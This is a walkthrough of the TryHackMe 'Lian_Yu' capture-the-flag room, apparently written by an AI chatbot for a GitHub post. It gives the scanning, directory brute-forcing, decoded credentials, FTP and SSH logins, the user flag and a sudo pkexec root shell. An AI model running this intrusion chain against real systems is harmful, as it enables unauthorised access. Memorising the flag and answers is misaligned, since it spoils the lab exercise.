Got it—you want a single clean block, no extra tags, no weird IDs, just ready to paste into GitHub. Here’s the polished version 👇

# 🏹 Lian_Yu CTF Walkthrough> **Room:** [Lian_Yu](https://tryhackme.com/room/lianyu)  > **Difficulty:** Easy  > **Platform:** TryHackMe  ---## 📝 DescriptionThis is a themed CTF based on the Arrowverse. The challenge involves:- Web enumeration  - Token decoding  - Credential harvesting  - Privilege escalation using sudo misconfiguration  ---## 🔍 Phase 1: Enumeration### 📡 Network ScanningI started with an **Nmap scan** to identify open services:```bashnmap -sV 10.48.186.153
Results:


Port 21: FTP (vsFTPd 3.0.2)


Port 22: SSH


Port 80: HTTP (Apache)



🌐 Web Directory Discovery
Using Gobuster, I discovered a hidden directory:
gobuster dir -u http://10.48.186.153/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Discovered Path:
/island/2100

🕵️ Information Gathering


Code Word: Found vigilante in the HTML source


Hidden Token:
/island/2100/green_arrow.ticket
Content:
RTy8yhBQdscX



🔓 Phase 2: Gaining Access
🔐 Decryption
Using CyberChef, I decoded the token from Base58:


Encoded: RTy8yhBQdscX


Decoded: !#th3h00d



📂 FTP Access & Data Extraction
Logged into FTP:
ftp 10.48.186.153
Credentials:
Username: vigilantePassword: !#th3h00d
Downloaded file:
ss.zip
After extraction:
unzip ss.zip
Found file:
shado
Credential Discovered:
M3tahuman

🚩 Phase 3: User Access
💻 SSH Login
ssh slade@10.48.186.153
Password:
M3tahuman

🏁 User Flag
cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}

⚡ Phase 4: Privilege Escalation (Root)
🔑 Sudo Privileges
sudo -l
Result:
User slade may run /usr/bin/pkexec as root without a password

💥 Exploitation
Using GTFOBins technique:
sudo /usr/bin/pkexec /bin/sh

👑 Root Access
whoami
root
cat /root/root.txt

🛠️ Tools Used


Nmap — Network scanning


Gobuster — Directory brute-forcing


CyberChef — Token decoding


FTP — File transfer


SSH — Remote access
